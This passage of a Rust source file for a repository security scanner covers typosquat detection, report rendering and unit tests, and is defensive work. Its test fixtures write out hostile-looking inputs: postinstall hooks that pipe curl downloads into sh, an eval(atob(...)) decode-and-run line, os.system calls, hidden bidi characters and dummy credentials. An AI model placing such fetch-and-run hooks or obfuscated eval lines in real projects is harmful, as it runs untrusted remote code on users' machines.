        format!("Dependency \"{shown}\" is one letter away from the popular package \"{popular}\": check it is the one you meant"),
    )
}

/// Edit distance counting insertions, deletions, substitutions and swaps of
/// two neighbouring characters. Returns 2 early for lengths further apart.
fn edit_distance(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    if a.len().abs_diff(b.len()) > 1 {
        return 2;
    }
    let mut d = vec![vec![0usize; b.len() + 1]; a.len() + 1];
    for (i, row) in d.iter_mut().enumerate() {
        row[0] = i;
    }
    for (j, cell) in d[0].iter_mut().enumerate() {
        *cell = j;
    }
    for i in 1..=a.len() {
        for j in 1..=b.len() {
            let cost = usize::from(a[i - 1] != b[j - 1]);
            let mut best = (d[i - 1][j] + 1)
                .min(d[i][j - 1] + 1)
                .min(d[i - 1][j - 1] + cost);
            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                best = best.min(d[i - 2][j - 2] + 1);
            }
            d[i][j] = best;
        }
    }
    d[a.len()][b.len()]
}

// ---------------------------------------------------------------------------
// Output
// ---------------------------------------------------------------------------

/// Plain-text listing for the terminal.
pub fn render_text(report: &AuditReport) -> String {
    let mut out = String::from("\n");
    out.push_str(&format!(
        "  Audit: {} file{}, {} finding{}, risk {}/100 ({})\n\n",
        report.files_scanned,
        if report.files_scanned == 1 { "" } else { "s" },
        report.total_findings,
        if report.total_findings == 1 { "" } else { "s" },
        report.risk_score,
        report.risk_level,
    ));
    if let Some(deps) = &report.dependencies {
        match &deps.error {
            Some(error) => out.push_str(&format!("  Dependencies not checked. {error}\n\n")),
            None if deps.lockfiles.is_empty() => {
                out.push_str("  Dependencies not checked: no supported lockfile found.\n\n")
            }
            None => out.push_str(&format!(
                "  Checked {} package version{} from {} against osv.dev.\n\n",
                deps.packages_checked,
                if deps.packages_checked == 1 { "" } else { "s" },
                if deps.lockfiles.len() <= 3 {
                    deps.lockfiles.join(", ")
                } else {
                    format!("{} lockfiles", deps.lockfiles.len())
                },
            )),
        }
    }
    if let Some(applied) = report.baseline {
        out.push_str(&crate::baseline::summary(applied, "finding"));
        out.push_str("\n\n");
        if report.findings.is_empty() {
            out.push_str("  No new findings.\n\n");
            return out;
        }
    }
    if report.findings.is_empty() {
        out.push_str("  No red flags found. This is not a safety verdict: the scan only\n");
        out.push_str("  looks for known patterns.\n\n");
        return out;
    }
    for f in &report.findings {
        let place = match f.line {
            Some(line) => format!("{}:{line}", f.file),
            None => f.file.clone(),
        };
        let context = match f.context {
            Some(kind) => format!(", {kind} file"),
            None => String::new(),
        };
        out.push_str(&format!(
            "  {:<6}  {place}  ({} confidence{context})\n          {}\n",
            f.severity.name().to_ascii_uppercase(),
            f.confidence.as_str(),
            f.message
        ));
    }
    if report.truncated {
        out.push_str(&format!(
            "\n  Showing the first {MAX_FINDINGS} of {} findings.\n",
            report.total_findings
        ));
    }
    if report.lowered > 0 {
        out.push_str(&format!(
            "\n  {} finding{} in tests, docs, examples, fixtures, vendored libraries or translations {} lowered one step.\n",
            report.lowered,
            if report.lowered == 1 { "" } else { "s" },
            if report.lowered == 1 { "was" } else { "were" },
        ));
    }
    out.push_str("\n  Red flags to review, not a safety verdict: clean code can trip a check\n");
    out.push_str("  and code that passes is not proven safe. Secret values are never printed.\n\n");
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn checks(findings: &[Finding]) -> Vec<&'static str> {
        findings.iter().map(|f| f.check).collect()
    }

    #[test]
    fn context_lowers_severity_and_confidence() {
        assert_eq!(context_of("tests/test_api.py"), Some("test"));
        assert_eq!(context_of("src/app.test.ts"), Some("test"));
        assert_eq!(context_of("docs/setup.md"), Some("docs"));
        assert_eq!(context_of("README.md"), Some("docs"));
        assert_eq!(context_of("examples/basic/main.rs"), Some("example"));
        assert_eq!(context_of("testdata/key.pem"), Some("fixture"));
        assert_eq!(context_of(".env.example"), Some("example"));
        assert_eq!(context_of("requirements.txt"), None);
        assert_eq!(context_of("src/latest/config.py"), None);
        assert_eq!(context_of("src/config.py"), None);
        assert_eq!(context_of("site/guide/keys.mdx"), Some("docs"));
        assert_eq!(context_of("content/github.markdoc"), Some("docs"));
        assert_eq!(context_of("scripts/mock-api/data.json"), Some("fixture"));
        assert_eq!(
            context_of(".yarn/releases/yarn-4.1.0.cjs"),
            Some("vendored")
        );
        assert_eq!(context_of("vendor/javascript/d3.js"), Some("vendored"));
        assert_eq!(context_of("static/libs/backbone-min.js"), Some("vendored"));
        assert_eq!(context_of("static/swagger-ui-bundle.js"), Some("vendored"));
        assert_eq!(
            context_of("src/locales/generated/fi.ts"),
            Some("translation")
        );
        assert_eq!(
            context_of("app/lang/translations/ar.yaml"),
            Some("translation")
        );
        assert_eq!(context_of("src/minimal.js"), None);

        let key = format!("{}{}", "AK", "IAZ7Q4K2M9P1R8T3V6");
        let mut found = audit_file("tests/conftest.py", format!("k = \"{key}\"").as_bytes());
        assert_eq!(found[0].confidence, Confidence::High);
        lower(&mut found[0], "test");
        assert_eq!(found[0].severity, Severity::Medium);
        assert_eq!(found[0].confidence, Confidence::Medium);
        let report = finish(1, found);
        assert_eq!(report.lowered, 1);
        let text = render_text(&report);
        assert!(text.contains("(medium confidence, test file)"));
        assert!(text.contains("not a safety verdict"));
    }

    #[test]
    fn audit_lowers_findings_in_tests() {
        let dir = tempfile::tempdir().unwrap();
        let key = format!("{}{}", "AK", "IAZ7Q4K2M9P1R8T3V6");
        fs::create_dir_all(dir.path().join("src")).unwrap();
        fs::create_dir_all(dir.path().join("tests")).unwrap();
        fs::write(dir.path().join("src/app.py"), format!("k = \"{key}\"\n")).unwrap();
        fs::write(dir.path().join("tests/fake.py"), format!("k = \"{key}\"\n")).unwrap();
        let report = audit(dir.path(), None);
        assert_eq!(report.findings.len(), 2);
        assert_eq!(report.findings[0].file, "./src/app.py");
        assert_eq!(report.findings[0].severity, Severity::High);
        assert_eq!(report.findings[0].context, None);
        assert_eq!(report.findings[1].severity, Severity::Medium);
        assert_eq!(report.findings[1].context, Some("test"));
        assert_eq!(report.risk_level, "high");
        let json = serde_json::to_value(&report).unwrap();
        assert!(json["note"]
            .as_str()
            .unwrap()
            .contains("not a safety verdict"));
        assert_eq!(json["findings"][0]["confidence"], "high");
    }

    #[test]
    fn audit_quiets_vendored_code_translations_and_docs() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let key = format!("{}{}", "AK", "IAZ7Q4K2M9P1R8T3V6");
        let rlo = '\u{202E}';
        for folder in [".yarn/releases", "locales", "docs", "src"] {
            fs::create_dir_all(root.join(folder)).unwrap();
        }
        let bundle = format!("var a=1;{}\n", "x+=1;".repeat(LONG_LINE));
        fs::write(root.join(".yarn/releases/yarn.cjs"), &bundle).unwrap();
        fs::write(
            root.join("locales/ar.ts"),
            format!("export default {{ a: \"{rlo}x\" }};\n"),
        )
        .unwrap();
        fs::write(root.join("docs/setup.mdx"), format!("AWS_KEY={key}\n")).unwrap();
        fs::write(root.join("src/app.js"), format!("if (a {rlo}) run();\n")).unwrap();
        let report = audit(root, None);
        let files: Vec<(&str, Option<&str>, Confidence)> = report
            .findings
            .iter()
            .map(|f| (f.file.as_str(), f.context, f.confidence))
            .collect();
        // The bundle's long line is expected, and the docs key is a sample.
        assert!(
            !files.iter().any(|(f, ..)| f.contains(".yarn")),
            "{files:?}"
        );
        assert!(files.contains(&("./docs/setup.mdx", Some("docs"), Confidence::Low)));
        // Direction marks in a translation are lowered, never in app code.
        assert!(files
            .iter()
            .all(|(f, c, _)| !f.contains("locales") || *c == Some("translation")));
        let app = report
            .findings
            .iter()
            .find(|f| f.file == "./src/app.js")
            .unwrap();
        assert_eq!((app.check, app.context), (HIDDEN_UNICODE, None));
    }

    #[test]
    fn finds_secrets_without_printing_them() {
        let key = format!("{}{}", "AK", "IAZ7Q4K2M9P1R8T3V6");
        let line = format!("aws_key = \"{key}\"");
        let found = audit_file("config.py", line.as_bytes());
        assert_eq!(checks(&found), vec![SECRET]);
        assert_eq!(found[0].severity, Severity::High);
        assert_eq!(found[0].line, Some(1));

        let report = finish(1, found);
        let text = render_text(&report);
        let json = serde_json::to_string(&report).unwrap();
        assert!(!text.contains(&key) && !json.contains(&key));
        assert!(!text.contains("Z7Q4K2M9P1R8T3V6"));
    }

    #[test]
    fn secret_rules_need_full_length_and_skip_examples() {
        let github = format!("{}{}", "gh", "p_");
        assert_eq!(
            find_secrets(&format!(
                "t = {github}{}",
                "aB3dE5gH7jK9mN1pQ3sT5vW7yZ9bC1dE3fG5"
            )),
            vec!["GitHub token"]
        );
        assert!(find_secrets(&format!("t = {github}short")).is_empty());
        assert!(find_secrets(&format!("{}{}", "AKIA", "IOSFODNN7EXAMPLE")).is_empty());
        assert!(find_secrets(&format!("{}{}", "sk_live_", "x".repeat(30))).is_empty());
        let pem = format!("{}RSA {}", PEM_BEGIN, PEM_PRIVATE);
        assert_eq!(find_secrets(&pem), vec!["private key"]);
    }

    #[test]
    fn private_keys_need_key_material() {
        let header = format!("{}RSA {}", PEM_BEGIN, PEM_PRIVATE);
        let body = "MIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8";
        let real = format!("key = \"{header}\\n{body}\\n\"");
        assert_eq!(checks(&audit_file("app.ts", real.as_bytes())), vec![SECRET]);
        let split = format!("{header}\n{body}\n");
        assert_eq!(
            checks(&audit_file("server.key", split.as_bytes())),
            vec![SECRET]
        );
        for fake in [
            format!("p = \"{header}\\n...\\n\""),
            format!("// Usually wrapped within {header} X -----END PRIVATE KEY-----."),
            format!("{header}\nMIIEpAIBAAKCAQEA...\n"),
        ] {
            assert!(audit_file("app.ts", fake.as_bytes()).is_empty(), "{fake}");
        }
    }

    #[test]
    fn firebase_web_keys_are_low() {
        let key = format!("{}{}", "AIza", "SyAd15pYlMci_xIp9ko6wkEsDzAAA0Dn0RU");
        let found = audit_file(
            ".env",
            format!("FIREBASE_CONFIG='{{\"apiKey\":\"{key}\"}}'").as_bytes(),
        );
        assert_eq!(found[0].severity, Severity::Low);
        assert_eq!(found[0].confidence, Confidence::Low);
        let found = audit_file(".env", format!("MAPS_KEY={key}").as_bytes());
        assert_eq!(found[0].severity, Severity::High);
    }

    #[test]
    fn skips_patterns_bundlers_and_drawings_produce() {
        let minified = format!(
            "{}({}('YWxlcnQoMSk='));var s=\"{}\"",
            "Function",
            "atob",
            "\\x41".repeat(50)
        );
        assert!(audit_file("lib/jquery.min.js", minified.as_bytes()).is_empty());
        assert!(audit_file("vendor/d3.js", minified.as_bytes()).is_empty());
        assert!(audit_file("lib/raphael-min.js", minified.as_bytes()).is_empty());

        let wasm = format!("export default toBinary(`AGFzbQ{}`);", "QUJD".repeat(150));
        assert!(audit_file("woff2-wasm.ts", wasm.as_bytes()).is_empty());

        let path = format!("<path d=\"M{}\" />", "12.5 3.4-1.2 ".repeat(500));
        assert!(audit_file("Logo.tsx", path.as_bytes()).is_empty());
    }

    #[test]
    fn tests_and_fixtures_hold_dummy_keys_and_data() {
        let dir = tempfile::tempdir().unwrap();
        let header = format!("{}RSA {}", PEM_BEGIN, PEM_PRIVATE);
        let body = "MIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8";
        fs::create_dir_all(dir.path().join("tests/certs")).unwrap();
        fs::write(
            dir.path().join("tests/certs/server.key"),
            format!("{header}\n{body}\n"),
        )
        .unwrap();
        fs::write(
            dir.path().join("tests/expected_test.go"),
            format!("var q = \"{}\"\n", "SELECT a ".repeat(800)),
        )
        .unwrap();
        let report = audit(dir.path(), None);
        assert_eq!(checks(&report.findings), vec![SECRET]);
        assert_eq!(report.findings[0].confidence, Confidence::Low);
    }

    #[test]
    fn private_packages_install_hooks_are_their_own() {
        let pkg = r#"{"private": true, "scripts": {"postinstall": "prisma generate"}}"#;
        assert!(audit_file("package.json", pkg.as_bytes()).is_empty());
        let risky = format!(
            r#"{{"private": true, "scripts": {{"postinstall": "{} https://x.sh | sh"}}}}"#,
            "curl"
        );
        assert_eq!(audit_file("package.json", risky.as_bytes()).len(), 1);
    }

    #[test]
    fn flags_bidi_controls_in_code() {
        let src = "let ok = true; // \u{202E} } \u{2066}\nok";
        let found = audit_file("src/lib.rs", src.as_bytes());
        assert_eq!(checks(&found), vec![HIDDEN_UNICODE]);
        assert_eq!(found[0].severity, Severity::High);
        let docs = audit_file("README.md", src.as_bytes());
        assert_eq!(docs[0].severity, Severity::Low);
    }

    #[test]
    fn flags_zero_width_but_not_a_leading_bom() {
        let found = audit_file("a.js", "\u{FEFF}const a = 1;\n".as_bytes());
        assert!(found.is_empty());
        let found = audit_file("a.js", "const a\u{200B}b = 1;\n".as_bytes());
        assert_eq!(checks(&found), vec![HIDDEN_UNICODE]);
    }

    #[test]
    fn flags_decode_then_eval() {
        let line = format!("{}({}('YWxlcnQoMSk='))", "eval", "atob");
        let found = audit_file("x.js", line.as_bytes());
        assert_eq!(checks(&found), vec![OBFUSCATION]);
        assert_eq!(found[0].severity, Severity::High);
        assert!(audit_file("x.md", line.as_bytes()).is_empty());
    }

    #[test]
    fn flags_blobs_and_long_lines_once() {
        let blob = format!(
            "const b = \"{}\";\nconst c = \"{}\";",
            "QUJD".repeat(150),
            "QUJD".repeat(150)
        );
        let found = audit_file("x.js", blob.as_bytes());
        assert_eq!(checks(&found), vec![OBFUSCATION]);

        let long = format!("var a=[{}];", "f(b),".repeat(1_200));
        assert_eq!(checks(&audit_file("x.js", long.as_bytes())), vec![MINIFIED]);
        assert!(audit_file("x.min.js", long.as_bytes()).is_empty());

        let escapes = format!("s = \"{}\"", "\\x41".repeat(50));
        assert_eq!(
            checks(&audit_file("x.py", escapes.as_bytes())),
            vec![OBFUSCATION]
        );
    }

    #[test]
    fn flags_executables_and_ignores_other_binaries() {
        let mut elf = b"\x7fELF".to_vec();
        elf.extend([0u8; 60]);
        let found = audit_file("tools/helper", &elf);
        assert_eq!(checks(&found), vec![BINARY]);

        let mut pe = vec![0u8; 0x80];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3c] = 0x40;
        pe[0x40..0x44].copy_from_slice(b"PE\0\0");
        assert_eq!(checks(&audit_file("a.dll", &pe)), vec![BINARY]);

        let png = [0x89u8, b'P', b'N', b'G', 0, 0, 0, 0];
        assert!(audit_file("logo.png", &png).is_empty());
    }

    #[test]
    fn flags_risky_install_scripts() {
        let pkg = format!(
            r#"{{
  "name": "x",
  "scripts": {{
    "postinstall": "{} https://example.com/a.sh | sh",
    "preinstall": "node check.js",
    "prepare": "husky install",
    "test": "jest"
  }}
}}"#,
            "curl"
        );
        let found = audit_file("package.json", pkg.as_bytes());
        let report = finish(1, found);
        assert_eq!(report.findings.len(), 2);
        assert_eq!(report.findings[0].severity, Severity::High);
        assert_eq!(report.findings[0].line, Some(4));
        assert_eq!(report.findings[1].severity, Severity::Low);
        assert_eq!(report.risk_level, "high");
    }

    #[test]
    fn flags_setup_py_and_build_rs() {
        let setup = "import os\n# os.system( in a comment\nos.system('id')\n";
        let found = audit_file("setup.py", setup.as_bytes());
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].line, Some(3));

        let build = "fn main() {\n    std::process::Command::new(\"cc\");\n}\n";
        let found = audit_file("build.rs", build.as_bytes());
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].severity, Severity::Low);
    }

    #[test]
    fn flags_typosquats() {
        let pkg = r#"{"dependencies": {"react": "^18", "reakt": "1", "preact": "10", "gaxios": "6", "@types/react": "18", "lodahs": "1"}}"#;
        let found = audit_file("package.json", pkg.as_bytes());
        let names: Vec<&str> = found.iter().map(|f| f.message.as_str()).collect();
        assert_eq!(found.len(), 2, "{names:?}");
        assert!(found.iter().all(|f| f.check == TYPOSQUAT));

        let reqs = "requests==2.31\nreqeusts\npython_dateutil\nscapy\n# numpi\n-r other.txt\n";
        let found = audit_file("requirements.txt", reqs.as_bytes());
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].line, Some(2));
    }

    #[test]
    fn edit_distance_counts_swaps() {
        assert_eq!(edit_distance("react", "react"), 0);
        assert_eq!(edit_distance("react", "raect"), 1);
        assert_eq!(edit_distance("react", "reac"), 1);
        assert_eq!(edit_distance("react", "reaxt"), 1);
        assert_eq!(edit_distance("react", "rxxct"), 2);
    }

    #[test]
    fn scores_and_caps() {
        let many: Vec<Finding> = (0..300)
            .map(|i| {
                finding(
                    Severity::Low,
                    MINIFIED,
                    &format!("f{i}.js"),
                    None,
                    String::new(),
                )
            })
            .collect();
        let report = finish(300, many);
        assert_eq!(report.risk_score, 100);
        assert_eq!(report.total_findings, 300);
        assert!(report.truncated);
        assert_eq!(report.findings.len(), MAX_FINDINGS);
        assert!(report.has_at_least(Severity::Low));
        assert!(!report.has_at_least(Severity::Medium));
        assert_eq!(finish(0, vec![]).risk_level, "none");
    }

    #[test]
    fn audits_a_folder() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("src")).unwrap();
        fs::write(dir.path().join("src/main.rs"), "fn main() {}\n").unwrap();
        fs::write(dir.path().join("src/evil.js"), "x\u{202E}y\n").unwrap();
        let report = audit(dir.path(), None);
        assert_eq!(report.files_scanned, 2);
        assert_eq!(report.findings.len(), 1);
        assert_eq!(report.findings[0].file, "./src/evil.js");
        assert!(render_text(&report).contains("./src/evil.js:1"));
    }
}
